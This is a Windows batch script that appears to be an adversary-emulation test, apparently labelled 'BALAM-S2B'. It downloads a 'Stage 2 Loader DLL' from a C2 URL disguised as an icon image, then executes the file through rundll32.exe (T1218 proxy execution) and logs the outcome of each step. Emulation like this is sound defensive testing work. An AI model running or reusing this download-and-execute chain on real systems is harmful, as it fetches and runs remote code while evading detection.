@echo off
setlocal enabledelayedexpansion

REM ── SET variable preamble ──────────────────────────────────────────────────
SET bvkrwx=BALAM-S2B
SET qlzmdt=7
SET fnjpcs=%APPDATA%\7\macula-simulations.log
SET hwotgr=%APPDATA%\10441\e20bac9a
SET ydxmkl=6f808de6.txt
SET cqpvzn=10441
SET erjbwi=https://10.0.0.49/stage/2/icon.png?10441-7
SET tklxqm=%APPDATA%\7

REM ── Cache timestamp once at script start ───────────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── Initialise log file (ensure parent dir exists, touch file) ─────────────
if not exist "!hwotgr!" mkdir "!hwotgr!" >nul 2>&1

REM ── DEBUG: script_start ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: script_start>> "!fnjpcs!" 2>nul

REM ══════════════════════════════════════════════════════════════════════════
REM  STEP 1 — Heartbeat fetch: download Stage 2 Loader DLL from C2
REM ══════════════════════════════════════════════════════════════════════════

REM ── DEBUG: heartbeat_start ─────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: heartbeat_start>> "!fnjpcs!" 2>nul

curl -k -s -o "!hwotgr!\!ydxmkl!" "!erjbwi!"
SET _hb_err=!ERRORLEVEL!

REM ── Refresh timestamp after heartbeat completes ────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── DEBUG: heartbeat_complete ──────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: heartbeat_complete=!_hb_err!>> "!fnjpcs!" 2>nul

REM ══════════════════════════════════════════════════════════════════════════
REM  STEP 2 — Change working directory to output dir
REM ══════════════════════════════════════════════════════════════════════════

REM ── DEBUG: chdir_start ─────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: chdir_start>> "!fnjpcs!" 2>nul

cd /d "!hwotgr!" >nul 2>&1
SET _cd_err=!ERRORLEVEL!

REM ── Refresh timestamp ──────────────────────────────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── DEBUG: chdir_result ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: chdir_result=!_cd_err!>> "!fnjpcs!" 2>nul

REM ══════════════════════════════════════════════════════════════════════════
REM  STEP 3 — LOLBIN invocation: T1218 System Binary Proxy Execution
REM           Execute downloaded Stage 2 Loader DLL via rundll32.exe
REM ══════════════════════════════════════════════════════════════════════════

REM ── DEBUG: rundll32_start ──────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: rundll32_start>> "!fnjpcs!" 2>nul

REM ── DEBUG: dll_load ───────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: dll_load>> "!fnjpcs!" 2>nul

rundll32.exe "!ydxmkl!", DllMain
SET _lb_err=!ERRORLEVEL!

REM ── Refresh timestamp after LOLBIN invocation ──────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── DEBUG: rundll32_complete ───────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: rundll32_complete=!_lb_err!>> "!fnjpcs!" 2>nul

REM ══════════════════════════════════════════════════════════════════════════
REM  STEP 4 — Per-TTP log line emit for T1218
REM ══════════════════════════════════════════════════════════════════════════

IF !_lb_err! EQU 0 (
    REM LOLBIN succeeded
    echo [!tsvar!][TTP][!bvkrwx!][!cqpvzn!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!fnjpcs!" 2>nul
) ELSE (
    REM LOLBIN failed — determine short error detail
    IF !_hb_err! NEQ 0 (
        SET _err_detail=dll_not_found
    ) ELSE (
        SET _err_detail=lolbin_execution_failed
    )
    echo [!tsvar!][TTP][!bvkrwx!][!cqpvzn!]: T1218^|System Binary Proxy Execution=[FAIL]:[!_err_detail!]>> "!fnjpcs!" 2>nul
)

REM ── DEBUG: script_end ──────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cqpvzn!]: script_end>> "!fnjpcs!" 2>nul

endlocal